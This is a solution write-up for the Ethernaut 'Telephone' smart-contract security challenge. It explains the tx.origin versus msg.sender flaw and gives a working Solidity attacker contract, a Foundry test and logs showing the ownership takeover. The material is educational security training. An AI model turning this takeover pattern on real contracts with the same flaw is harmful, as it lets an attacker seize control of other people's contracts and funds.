# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)

# What You're Supposed to Do?

in `04-Telephone` Challenge, You Should Try To find a Way to Take Ownership of the Contract as Attacker.

`04-Telephone` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)


# How did i Complete This Challenge?

Lets Take a Look At `changeOwner` function:

```javascript
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```

First We have to Understand the Difference between `msg.sender` and `tx.origin`:

`A` is an EOA account.
`B` is An Contract.
`C` is An Another Contract.

`msg.sender` represents the caller of the current function and `tx.origin` represents the initial external account (EOA) that started the transaction. So if `A` calls `B` Contract and then `B` calls the `C` Contract, in Contract `C`, the `msg.sender` is `B` and `tx.origin` is `A`.

lets take a Look at if Statement of `changeOwner` function:

```javascript
    if (tx.origin != msg.sender) {
                owner = _owner;
    }
```

What Attacker Will Do is To Create Contract that Calls the `changeOwner` function, Now the Result of `if (tx.origin != msg.sender)` will be `true`.

Something Like this:

```javascript
    contract AttackerContract {

        Telephone telephone;

        constructor(Telephone _telephone) {
            telephone = _telephone;
        }

        function takeOwnershipAttack(address _newOwner) external {
            telephone.changeOwner(_newOwner);
        }

    }
```

Then i Wrote a Test to Take Ownership of `Telephone.sol` with utilizing the `AttackerContract` Contract.

```javascript
    function testTakeOverTheOwnership() external {
        vm.startPrank(owner);
        assertEq(telephone.owner(), owner);
        console2.log("Owner Address: ", owner);
        console2.log("Attacker Address: ", attacker);
        vm.stopPrank();

        vm.startPrank(attacker);
        console2.log("Telephone Contract Owner Before the Attack: ", telephone.owner());
        AttackerContract attackerContract = new AttackerContract(telephone);
        attackerContract.takeOwnershipAttack(attacker);
        console2.log("Telephone Contract Owner Before the Attack: ", telephone.owner());
        vm.stopPrank();
        assertEq(attacker, telephone.owner());
    }
```

You can Run this Test With Command Below in Your Terminal: (Required to Have Foundry Installed.)

```javascript
    forge test --match-test testTakeOverTheOwnership -vvvv
```

Take a Look At `Logs`:

```javascript
    Logs:
        Owner Address:  0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
        Attacker Address:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
        Telephone Contract Owner Before the Attack:  0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
        Telephone Contract Owner After the Attack:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
```